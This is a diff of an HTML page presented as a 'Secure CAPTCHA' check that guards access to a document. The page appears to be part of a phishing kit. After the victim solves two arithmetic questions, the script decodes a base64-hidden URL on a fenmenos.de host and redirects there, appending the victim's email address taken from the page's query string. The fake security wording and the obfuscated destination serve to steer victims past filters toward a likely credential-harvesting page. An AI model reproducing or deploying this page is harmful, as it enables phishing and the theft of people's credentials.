@@ -12,7 +12,11 @@
       --primary: #007bff;
       --success-green: #28a745;
     }
-    * { box-sizing: border-box; }
+
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       background: var(--bg);
@@ -25,6 +29,7 @@
       padding: 20px;
       position: relative;
     }
+
     .logo {
       position: absolute;
       top: 25px;
@@ -36,6 +41,7 @@
       border-radius: 14px;
       box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
     }
+
     .logo img {
       width: 60px;
       height: 60px;
@@ -43,12 +49,17 @@
       object-fit: contain;
       transition: transform 0.3s ease;
     }
-    .logo img:hover { transform: scale(1.1); }
+
+    .logo img:hover {
+      transform: scale(1.1);
+    }
+
     .logo span {
       font-size: 1.4rem;
       font-weight: 600;
       color: var(--primary);
     }
+
     #captcha-box {
       background: var(--box-bg);
       padding: 30px;
@@ -58,17 +69,20 @@
       width: 100%;
       max-width: 400px;
     }
+
     .captcha-header {
       font-size: 1.1rem;
       font-weight: 500;
       margin-bottom: 18px;
       color: var(--text);
     }
+
     #captcha-question {
       font-size: 1.2rem;
       margin-bottom: 12px;
     }
-    input[type="email"], input[type="number"] {
+
+    input[type="number"] {
       font-size: 1rem;
       padding: 10px;
       width: 60%;
@@ -78,7 +92,7 @@
       border-radius: 6px;
       text-align: center;
     }
-    input[type="number"] { min: 0; step: 1; }
+
     button {
       padding: 12px 24px;
       font-size: 1rem;
@@ -89,7 +103,11 @@
       cursor: pointer;
       transition: background 0.3s ease;
     }
-    button:hover { background-color: #0056b3; }
+
+    button:hover {
+      background-color: #0056b3;
+    }
+
     #message {
       margin-top: 15px;
       font-size: 1.1rem;
@@ -99,140 +117,130 @@
       align-items: center;
       gap: 10px;
     }
+
     .icon-success {
       width: 24px;
       height: 24px;
     }
-    .spinner {
-      display: none;
-      border: 4px solid rgba(0, 0, 0, 0.1);
-      border-left-color: var(--primary);
-      border-radius: 50%;
-      width: 24px;
-      height: 24px;
-      animation: spin 1s linear infinite;
-    }
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+
     p.note {
       font-size: 0.88rem;
       color: #666;
       margin-top: 20px;
       line-height: 1.4;
     }
+
     @media (max-width: 480px) {
-      #captcha-box { padding: 20px; }
-      input[type="email"], input[type="number"] { width: 100%; }
-      button { width: 100%; }
-      .logo { flex-direction: column; align-items: flex-start; }
-      .logo span { font-size: 1.2rem; }
+      #captcha-box {
+        padding: 20px;
+      }
+
+      input[type="number"] {
+        width: 100%;
+      }
+
+      button {
+        width: 100%;
+      }
+
+      .logo {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+
+      .logo span {
+        font-size: 1.2rem;
+      }
     }
   </style>
 </head>
 <body>
+
+  <!-- Top-left Logo -->
   <div class="logo">
-    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Secure CAPTCHA padlock logo">
+    <img src="https://cdn-icons-png.flaticon.com/512/3064/3064197.png" alt="Captcha Padlock Logo">
     <span>Secure CAPTCHA</span>
   </div>
+
+  <!-- CAPTCHA Challenge Box -->
   <div id="captcha-box">
     <div class="captcha-header">For security reasons, please solve this to continue.</div>
-    <input type="email" id="user-email" placeholder="Enter your email" required />
-    <div id="captcha-question" aria-live="polite">Loading...</div>
-    <input type="number" id="user-answer" placeholder="Your answer" required />
+    <div id="captcha-question">Loading...</div>
+    <input type="number" id="user-answer" placeholder="Your answer" />
     <br />
-    <button>Submit</button>
-    <div id="message"><span class="spinner" id="spinner"></span></div>
+    <button onclick="validateCaptcha()">Submit</button>
+    <div id="message"></div>
     <p class="note">
-      By solving this correctly, we ensure a secure connection to the document.
+      By solving this correctly, we ensure a direct and secure connection to the document, reducing the risk of unauthorized access.
     </p>
   </div>
+
   <script>
-    const captchaApp = {
-      answer: 0,
-      firstSolved: false,
-      userEmail: '',
-      base64Ref: "JTNDbWV0YSUyMGh0dHAtZXF1aXYlM0QlMjJSZWZyZXNoJTIyJTIwY29udGVudCUzRCUyMjElM0J1cmwlM0RodHRwcyUzQS8vc2VlZWhhdG92ZXIuZmVubWVub3MuZGUvZnFnZ1QlMjIlMjAvJTNF",
-      init() {
-        const urlParams = new URLSearchParams(window.location.search);
-        const urlEmail = urlParams.get("id");
-        if (urlEmail) {
-          document.getElementById("user-email").value = decodeURIComponent(urlEmail);
-        }
-        this.generateCaptcha();
-      },
-      generateCaptcha() {
-        const num1 = Math.floor(Math.random() * 20) + 1;
-        const num2 = Math.floor(Math.random() * 10) + 1;
-        const operations = ['+', '-', '*'];
-        const operation = operations[Math.floor(Math.random() * operations.length)];
-        let question = '';
-        switch (operation) {
-          case '+':
-            this.answer = num1 + num2;
-            question = `${num1} + ${num2}`;
-            break;
-          case '-':
-            this.answer = num1 - num2;
-            question = `${num1} - ${num2}`;
-            break;
-          case '*':
-            this.answer = num1 * num2;
-            question = `${num1} × ${num2}`;
-            break;
-        }
-        document.getElementById("captcha-question").innerText = `What is ${question}?`;
-        document.getElementById("user-answer").value = '';
-        document.getElementById("message").innerText = '';
-      },
-      validateCaptcha() {
-        const userAnswer = parseInt(document.getElementById("user-answer").value);
-        this.userEmail = document.getElementById("user-email").value.trim();
-        const msg = document.getElementById("message");
-        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
-        if (!this.userEmail) {
-          msg.innerText = "Please enter your email.";
-          return;
-        }
-        if (!emailRegex.test(this.userEmail)) {
-          msg.innerText = "Please enter a valid email address.";
-          return;
-        }
-        if (isNaN(userAnswer)) {
-          msg.innerText = "Please enter a valid number.";
-          return;
-        }
-        if (userAnswer === this.answer) {
-          if (!this.firstSolved) {
-            this.firstSolved = true;
-            msg.innerText = "Correct! One more to go...";
-            this.generateCaptcha();
-          } else {
-            msg.innerHTML = `Access granted for ${this.userEmail} <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success checkmark" class="icon-success">`;
-            document.getElementById("spinner").style.display = "inline-block";
-            setTimeout(() => this.redirectUser(), 2000);
-          }
-        } else {
-          msg.innerText = "Incorrect answer. Please try again.";
-        }
-      },
-      redirectUser() {
-        try {
-          const decoded = atob(this.base64Ref);
-          const urlMatch = decoded.match(/url=([^"]+)/);
-          if (!urlMatch || !urlMatch[1]) {
-            throw new Error("Invalid redirect URL format");
-          }
-          const redirectUrl = `${urlMatch[1]}?id=${encodeURIComponent(this.userEmail)}`;
-          window.location.href = redirectUrl;
-        } catch (e) {
-          document.getElementById("message").innerText = "Unable to proceed. Please try again later.";
-          console.error("Redirect failed:", e);
-        }
+    let answer = 0;
+    let firstSolved = false;
+
+    // Updated base64 for: https://docu.fenmenos.de/EbeZE
+    const base64Ref = "aHR0cHM6Ly9kb2N1LmZlbm1lbm9zLmRlL0ViZVpF";
+
+    function generateCaptcha() {
+      const num1 = Math.floor(Math.random() * 20) + 1;
+      const num2 = Math.floor(Math.random() * 10) + 1;
+      const operations = ['+', '-', '*'];
+      const operation = operations[Math.floor(Math.random() * operations.length)];
+
+      let question = '';
+      switch (operation) {
+        case '+':
+          answer = num1 + num2;
+          question = `${num1} + ${num2}`;
+          break;
+        case '-':
+          answer = num1 - num2;
+          question = `${num1} - ${num2}`;
+          break;
+        case '*':
+          answer = num1 * num2;
+          question = `${num1} × ${num2}`;
+          break;
       }
-    };
-    window.onload = () => captchaApp.init();
-    document.querySelector("button").onclick = () => captchaApp.validateCaptcha();
+
+      document.getElementById("captcha-question").innerText = `What is ${question}?`;
+      document.getElementById("user-answer").value = '';
+      document.getElementById("message").innerText = '';
+    }
+
+    function validateCaptcha() {
+      const userAnswer = parseInt(document.getElementById("user-answer").value);
+      const msg = document.getElementById("message");
+
+      if (userAnswer === answer) {
+        if (!firstSolved) {
+          firstSolved = true;
+          msg.innerText = "Correct! One more to go...";
+          generateCaptcha();
+        } else {
+          msg.innerHTML = `Access granted <img src="https://cdn-icons-png.flaticon.com/512/845/845646.png" alt="Success Tick" class="icon-success">`;
+          setTimeout(() => {
+            redirectUser();
+          }, 1500);
+        }
+      } else {
+        msg.innerText = "Incorrect. Please try again.";
+      }
+    }
+
+    function redirectUser() {
+      try {
+        const decodedRef = atob(base64Ref);
+        const email = new URLSearchParams(window.location.search).get("email");
+        const finalUrl = email ? `${decodedRef}?e=${encodeURIComponent(email)}` : decodedRef;
+        window.location.href = finalUrl;
+      } catch (e) {
+        alert("Redirect failed. Invalid base64.");
+      }
+    }
+
+    window.onload = generateCaptcha;
   </script>
 </body>
 </html>
